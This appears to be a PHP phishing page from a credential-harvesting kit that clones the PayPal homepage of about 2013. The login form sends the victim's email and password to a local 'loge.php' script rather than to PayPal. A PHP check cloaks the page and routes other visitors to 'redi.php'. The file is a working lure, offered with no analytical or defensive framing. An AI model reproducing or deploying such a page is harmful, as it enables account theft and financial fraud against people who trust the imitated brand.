<?php
if($myhost == $port){
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
   
      <!--
      		Script info: script: webscr, cmd: _home, template: xpt/Marketing_CommandDriven/homepage/MainHome, date: jan 10, 2013 21:59:17 PST; country: US, language: en_US, xslt server: 
      		web version: 67.0-1741654 branch: BWR_670_int
      		DXPT: true (LOCALE: en_US, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
      		pexml version: 67.0-1755747
      		page XSL: Marketing_CommandDriven/default/en_US/homepage/MainHome.xsl
             hostname : FHe-zeL7U0QVP0cA77RtReRQO6g7Oe.XuZVHBgG0yQI
               rlogid : FHe%2bzeL7U0QVP0cA77RtRWw6Zv0dCgr8OJ%2fIAdsxr%2fmY55lFMOviYQ%3d%3d_12e631f1d2c
      -->
      
      <title>Send Money, Pay Online or Set Up a Merchant Account with PayPal</title>
      <meta name="keywords" content="send money, pay online, merchant account">
      <meta name="description" content="PayPal is the faster, safer way to send money, make an online payment, receive money or set up a merchant account.">
      <meta http-equiv="X-UA-Compatible" content="IE=8">

      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/core.css">
      <link media="print" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/print.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/marketing/marketing.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/Marketing/css/pages/ConsumerRevamp.css">
      <!--[if IE 8]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie8.css"><![endif]-->
      
      <!--[if IE 7]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->
      
      <!--[if lte IE 6]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
      
      <link rel="apple-touch-icon" href="WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png"><script type="text/javascript">
	 
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><style type="text/css">#welcomebox {background:url(https://www.paypal.com/en_US/Marketing/i/header/hdr_cpr_welcome_560x82.gif) no-repeat;}</style><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/Marketing_CommandDriven/homepage/MainHome';PAYPAL.tns.flashLocation = 'https://www.paypal.com/en_US/m/mid.swf';</script><link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">

   </head>
   <body>
      <noscript>
         <p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p>
      </noscript>
      <div class="outside home" id="page">
         <div id="header" class="std">
            <h1><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
            <form method="post" id="searchForm" name="searchForm" action="https://www.paypal-search.com/socialsearch/query">
               <fieldset id="myDynamicAutoComplete" class="autocomplete">

                  <legend>Search PayPal</legend><label for="searchBox">Search </label><input type="text" id="searchBox" name="q" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input type="submit" class="button" id="search.x" name="search.x" value="Search" autocomplete="off"></fieldset><input type="hidden" name="bn_of" value="html"><input type="hidden" name="access" value="p"><input type="hidden" name="ie" value="UTF-8"><input type="hidden" name="oe" value="UTF-8"><input type="hidden" name="start" value="0"><input type="hidden" name="num" value="10"><input type="hidden" name="filter" value="p"><input type="hidden" name="mode" value="live"><input type="hidden" name="pp_domain_name" value="www.paypal.com"><input type="hidden" id="bn_cc" name="cc" value="www"><input type="hidden" id="bn_cn" name="cn" value="paypal"><input type="hidden" name="client" value="US_Frontend"><input type="hidden" name="irFilter" value="US_en_US_Collection"><input type="hidden" name="login_status" value="0"><input type="hidden" name="country" value="US"><input type="hidden" name="language" value="en_US"><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navGlobal"><span><a href="#content" class="accessAid skip">Skip to main content</a></span><ul>
                  <li class="first signup"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Sign Up</a></li>
                  <li class="login"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run">Log In</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help">Help</a></li>

                  <li class="last"><a href="https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=security/online_security_center">Security and Protection</a></li>
               </ul>
            </div>
            <form method="post" id="rosetta" class="rosetta" action="?cmd=_home&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>">
			
               <fieldset>
                  <legend><span class="accessAid">Changer de langue</span></legend><label for="rosetta_dropdown">Language Select</label>
				  <select id="rosetta_dropdown" name="locale_x">
                     <option value="EN" selected>English</option>
                     <option value="ES">Espa&ntilde;ol</option>
					 <option value="FR">Fran&ccedil;ais</option></select>
		   
		   <input type="submit" name="testName" value="&gt;" class="button mini">
		   <input type="hidden" id="change_locale_x" name="change_locale.x" value="1">
		   </fieldset>
		   
		   <input type="hidden" name="cmd" value="ok">
		   <input name="form_charset" type="hidden" value="UTF-8">
		   </form>
            <div id="navPrimary">
               <ul>
                  <li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Home</a></li>

                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a></li>
                  <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Business</a></li>
                  <li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Developers</a></li>
                  <li><a href="https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Community</a></li>
               </ul>
            </div>
         </div>

         <hr>
         <div id="content">
            <div class="sidebar box login">
               <div class="header">
                  <h2>Account login</h2>
               </div>
               <div class="body">
                  <form method="post" name="login_form" action="loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8<?php echo "&ee=$ee"; ?>">

                     <fieldset>
                        <legend>Member Log In</legend>
                        <p><label for="login_email">Email address</label><input type="text" id="login_email" name="login_email" value=""></p>
                        <p><label for="login_password">PayPal password</label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""><script type="text/javascript">
<!--hide from JavaScript-challenged browsers
YAHOO.util.Event.addListener(window, "load", function(){
document.login_form.login_password.focus();
if (document.login_form.login_email.value == '') {
document.login_form.login_email.focus();
}
});
// done hiding -->
</script></p>
                        <p><label for="target_page">Go to</label><select id="target_page" name="target_page">
                              <option value="0" selected>My account</option>

                              <option value="1">My transactions</option></select></p><input type="submit" name="submit.x" value="Log In" class="button primary"></fieldset>
                     <p><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">Problem with login?</a></p>
                     <p>New to PayPal? <strong><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Sign up</a></strong>.                     </p><input name="form_charset" type="hidden" value="UTF-8"></form>
               </div>
            </div>
            <div id="maincontent">

               <div id="welcomebox">
                  <div class="welcomeLeft">
                     <h1>The world&#8217;s most-loved way to pay and get paid. <a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">Learn More</a></h1>
                  </div>
               </div>
               <div class="t1mpi">
                  <div class="MktMPI" id="mpi600005"><a href=https://www.paypal.com/us/cgi-bin/webscr?cmd=_mpi-click-outside&cid=8057&oid=38934&bn=AjYsXGN6DA8XUCUfQBA&s=NAo3MxA&landing_url=ORAcFnkYQgcdFgwCQFsADwo8KBopNBZsFSYkQDgsRQoGSHRsYAZlZEVeZwBoRXNWYlRFUg><img src='https://securepics.ebaystatic.com/aw/pics/paypal/site/us/2011/imgpp_05_USJan11ShopMainHome_542wx228h.jpg' border='0' alt=''/></a></div>
               </div>
               <div id="payments">
                  <div class="firstbox">
                     <h3><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">Pay Online</a></h3>
                     <p>Shop and pay online quickly and securely.</p>
                     <p class="learnMoreArrow"><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">Learn More</a></p>
                  </div>

                  <div class="secondbox">
                     <h3><a href="https://www.paypal.com/sendmoney">Send Money</a></h3>
                     <p>Send money to anyone with an email address.</p>
                     <p class="learnMoreArrow"><a href="https://www.paypal.com/sendmoney">Learn More</a></p>
                  </div>
                  <div class="thirdbox">
                     <h3><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">Get Paid</a></h3>

                     <p>Accept online payments for items you sell.</p>
                     <p class="learnMoreArrow"><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">Learn More</a></p>
                  </div><img src="WEBSCR-640-20101004-1/en_US/Marketing/i/scr/scr_cpr_graydots_547x1.gif" border="0" class="dottedline" alt=""><p class="acceptCredit">Looking to accept credit cards or set up a merchant account? Visit <a href="https://www.paypal.com/merchants">Merchant Services</a></p>
               </div>
            </div>
            <div id="counter">
               <div class="topborder"></div>

               <div class="sideborders">
                  <p><span id="NoOfUserLogin">+100 million</span></p>
                  <p class="pplwrld">people worldwide using PayPal</p>
                  <p class="signup"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Sign Up</a></p>
               </div>
               <div class="btmborder"></div>
            </div>

            <div id="bgleftgradient">
               <div class="leftHeader">
                  <h3>Get to Know PayPal</h3>
               </div>
               <div id="leftBody">
                  <ul>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">How PayPal Works</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal">Getting Started</a></li>

                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account">Managing Your Account</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal">Great Ways to Use PayPal</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ">Top 10 Things to Know about PayPal</a></li>
                  </ul>
               </div>
            </div>
            <div id="brandbar" class="noBottomMargin">

               <div class="MktMPI" id="mpi600007"><a href=https://www.paypal.com/us/cgi-bin/webscr?cmd=_mpi-click-outside&cid=6472&oid=39652&bn=AjYsXGN6DA8XUCUfQBA&s=NAo3MxA&landing_url=ORAcFnkYQgcdFgwCQFsADwo8KBopNBZsFSYkQDgsRQoGSHRsYAZlZEVTYQ1iRXpUZVdRS3I><img src='WEBSCR-640-20101004-1/aw/pics/paypal/site/us/2011/US_RuelalaUbiqFootExcl_750x70.jpg' border='0' alt=''/></a></div>
            </div>
            <div class="pd_bottom_box">
               <div class="pd_bottom_box_title">
                  <h3>All Personal Products &amp; Services</h3>
               </div>
               <div class="wrapper">

                  <h4>Pay Online</h4>
                  <ul>
                     <li><a target="_blank" href="https://www.paypal-shopping.com/">PayPal Shopping</a></li>
                     <li><a target="_blank" href="https://www.paypal-shopping.com/shop-stores.html">PayPal Store Directory</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2">PayPal Credit</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/mobile_payments&amp;nav=0.1.3#payonline">Shop via Your Mobile</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Send Money</h4>
                  <ul>
                     <li><a href="https://www.paypal.com/sendmoney">Send Money Online</a></li>
                     <li><a href="https://www.paypal.com/international-money-transfer">International Money Transfer</a></li>

                     <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2">To Your Teen</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney">Via Your Mobile</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Get Paid</h4>
                  <ul>

                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay">Sell on eBay</a></li>
                     <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/accept_credit_cards">Accept Credit Cards</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/request_money">Request Money</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise">Fundraise</a></li>
                     <li><a href="https://www.paypal.com/merchants">Merchant Services</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Other</h4>
                  <ul>
                     <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=1.2.2">Student Account</a></li>
                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments">PayPal Mobile</a></li>
                     <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_upgrade-interest-marcom&amp;outside=1">Money Market Fund</a></li>

                     <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/debit_card">PayPal Debit Card</a></li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/BillMeLater_ProductOverview">Bill Me Later&reg;, a PayPal service</a></li>
                  </ul>
               </div>
            </div>
            <div id="footer">
               <h5 class="accessAid">More Information</h5>

               <ul>
                  <li class="first"><a href="http://www.paypal-media.com/aboutus.cfm">About Us</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Contact Us</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside">Fees</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/jobs-outside">Jobs</a></li>
                  <li><a href="https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=developer/home">Developers</a></li>

                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-merchant">Merchant Services</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-country-functionality-outside">Worldwide</a></li>
                  <li>
<a href="javascript:O_LC()">Site Feedback</a> <img 
src="WEBSCR-640-20101004-1/css/Customer/pages/img/sm_333_oo.gif" alt="Site Feedback"></li>
               </ul>
               <ul>

                  <li class="first"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy</a></li>
                  <li><a href="http://www.thepaypalblog.com">Our Blog</a></li>
                  <li><a href="https://www.paypal-labs.com">Labs</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_web-referrals-mrb-outside">Referrals</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Legal Agreements</a></li>
                  <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside">Site Map</a></li>

                  <li class="last"><a href="http://www.ebay.com/">eBay</a></li>
               </ul>
               <p id="footerSecure"><a target="_blank" href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>
               <p id="legal">Copyright &copy; 1999-2013 PayPal. All rights reserved.</p>
            </div>
         </div>
         <div id="navFull">

            <ul>
               <li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Home</a><ul>
                     <li class="active"><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0" class="scTrack:SRD:Nav:W8">How PayPal Works</a><ul>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0.0" class="scTrack:SRD:Nav:YX">What is PayPal</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal&amp;nav=0.0.1" class="scTrack:SRD:Nav:YY">Getting Started</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account&amp;nav=0.0.2" class="scTrack:SRD:Nav:YZ">Managing Your Account</a></li>

                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal&amp;nav=0.0.3" class="scTrack:SRD:Nav:W2">Great Ways to Use PayPal</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ&amp;nav=0.0.4" class="scTrack:SRD:Nav:Z0">Top Ten Things to Know About PayPal</a></li>
                           <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside&amp;nav=0.0.5" class="scTrack:SRD:Nav:y80">How Much It Costs</a></li>
                           <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside&amp;nav=0.0.6" class="scTrack:SRD:Nav:Z8">Account Types</a></li>
                        </ul>
                     </li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/pay_online&amp;nav=0.1" class="scTrack:SRD:Nav:W3">Pay Online</a><ul>

                           <li><a href="https://www.paypal-shopping.com/" class="scTrack:SRD:Nav:Z2">Great Deals</a></li>
                           <li><a href="https://www.paypal-shopping.com/shop-stores.html" class="scTrack:SRD:Nav:Z3">PayPal Store Directory</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2" class="scTrack:SRD:Nav:W4">PayPal Extras MasterCard</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#payonline&amp;nav=0.1.3" class="scTrack:SRD:Nav:L6">Shop Via Mobile</a></li>
                        </ul>
                     </li>
                     <li><a href="https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:N9">Send Money</a><ul>

                           <li><a href="https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:O1">Send Money Online</a></li>
                           <li><a href="https://www.paypal.com/international-money-transfer" class="scTrack:SRD:Nav:O2">Internationally</a></li>
                           <li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2" class="scTrack:SRD:Nav:MR">To Your Teen</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney&amp;nav=0.2.3" class="scTrack:SRD:Nav:Y4">Via Your Mobile</a></li>
                        </ul>
                     </li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/receive_money&amp;nav=0.3" class="scTrack:SRD:Nav:Y5">Get Paid</a><ul>

                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/request_money&amp;nav=0.3.0" class="scTrack:SRD:Nav:Y6">Request Money</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_0&amp;nav=0.3.1" class="scTrack:SRD:Nav:Y7">Sell on eBay</a></li>
                           <li><a href="https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_1&amp;nav=0.3.2" class="scTrack:SRD:Nav:P6">Sell with Classifieds</a></li>
                           <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/wp_standard&amp;nav=0.3.3" class="scTrack:SRD:Nav:BM76">Sell on Your Website</a></li>
                           <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise&amp;nav=0.3.4" class="scTrack:SRD:Nav:P7">Fundraise</a></li>
                        </ul>
                     </li>
                     <li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/products_services&amp;nav=0.4" class="scTrack:SRD:Nav:P8">Products &amp; Services</a></li>
                  </ul>
               </li>
               <li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a></li>
               <li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Business</a></li>

               <li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Developers</a></li>
               <li><a href="https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Community</a></li>
            </ul>
         </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div>
      <script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20110306-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/iconix.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="js/tns/min/bid.js"></script><script type="text/javascript">
                                YAHOO.util.Event.addListener(window,"load",function(){
                                       try {
                            PAYPAL.bp.init("login_form","bp_mid");PAYPAL.ks.init("login_form","login_password","bp_ks1");PAYPAL.common.appendField("login_form", "bp_ks2");PAYPAL.common.appendField("login_form", "bp_ks3");
                                    } catch(err){}
                                });
                            </script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>

      <!-- SiteCatalyst Code
      Copyright 1997-2005 Omniture, Inc.
      More info available at http://www.omniture.com -->
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>
      <script type="text/javascript">
      s.prop1="xpt/Marketing_CommandDriven/homepage/MainHome";
      s.prop7="Unknown";
      s.prop8="Unknown";
      s.prop9="Unknown";
      s.prop10="US";
      s.prop14="";
      s.prop16="";
      s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
      s.prop15="";
      s.pageName="SRD: Main Home";
      s.channel="SRD";
      s.prop50="en_US";
      s.prop18="";
      </script>
      <script type="text/javascript"><!--
      /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
      var s_code=s.t();if(s_code)document.write(s_code);
      if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
      //-->
      </script><noscript><img
      src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
      height="1" width="1" border="0" alt="" /></noscript>
      <!--/DO NOT REMOVE/-->
      
      <!-- End SiteCatalyst Code -->
      <script type="text/javascript">			
						YUE.addListener(window, "load", function() {								
							PAYPAL.util.lazyLoad("js/Customer/min/baynote.js", function() {
								var searchFormsIDs = ["searchForm", "searchformnew", "searchform"];									
								YUE.addListener(searchFormsIDs, 'submit', function() {baynote_handleSubmit(this);});			
								            
                                var bn_timeout = setTimeout(function() {
									if (typeof baynote_validateSearchBox == 'function') {
										baynote_validateSearchBox();
										clearTimeout(bn_timeout);
									}
								}, 200);
							});
						});
						</script></body>

</html>
<?php
}else{
include "redi.php";
}
?>